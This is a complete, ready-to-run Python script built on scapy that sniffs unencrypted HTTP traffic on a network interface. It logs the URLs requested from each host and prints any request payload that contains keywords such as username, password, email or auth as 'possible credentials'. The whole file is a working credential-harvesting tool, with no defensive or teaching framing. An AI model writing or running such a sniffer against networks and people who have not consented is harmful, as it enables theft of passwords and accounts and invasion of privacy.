#!/usr/bin/env python3
import argparse
import sys
from scapy.all import sniff, Raw, conf
from scapy.layers.http import HTTPRequest

# Keywords to look for in HTTP payloads (possible credentials)
KEYWORDS = [b"username", b"user", b"login", b"password", b"pass", b"email", b"auth"]


def get_url(packet):
    """Extract the full URL from an HTTP request packet."""
    try:
        host = packet[HTTPRequest].Host.decode(errors="ignore")
        path = packet[HTTPRequest].Path.decode(errors="ignore")
        return f"http://{host}{path}"
    except Exception:
        return None


def get_login_info(packet):
    """Search packet payload for possible usernames/passwords."""
    if packet.haslayer(Raw):
        load = bytes(packet[Raw].load)
        # Search on bytes to avoid encoding issues; lowercase for case-insensitive match
        lowered = load.lower()
        for keyword in KEYWORDS:
            if keyword in lowered:
                return load.decode(errors="replace").strip()
    return None


def process_packet(packet):
    """Callback executed for every captured HTTP packet."""
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        if url:
            # Source IP of the packet
            src = packet[0][1].psrc if hasattr(packet[0][1], "psrc") else "?"
            print(f"[+] HTTP Request | {src} >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print("\n" + "=" * 60)
            print(f"[+] Possible credentials:\n{login_info}")
            print("=" * 60 + "\n")


def sniffing(interface, count=0):
    """Start sniffing on the given interface."""
    print(f"[*] Sniffing on interface: {interface}")
    try:
        sniff(iface=interface, store=False, prn=process_packet,
              filter="tcp port 80", count=count)
    except PermissionError:
        print("[!] Root privileges required. Run with sudo.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Sniffing stopped by user.")


def main():
    parser = argparse.ArgumentParser(description="HTTP packet sniffer")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface (default: eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to capture (0 = infinite)")
    args = parser.parse_args()

    sniffing(args.interface, args.count)


if __name__ == "__main__":
    main()
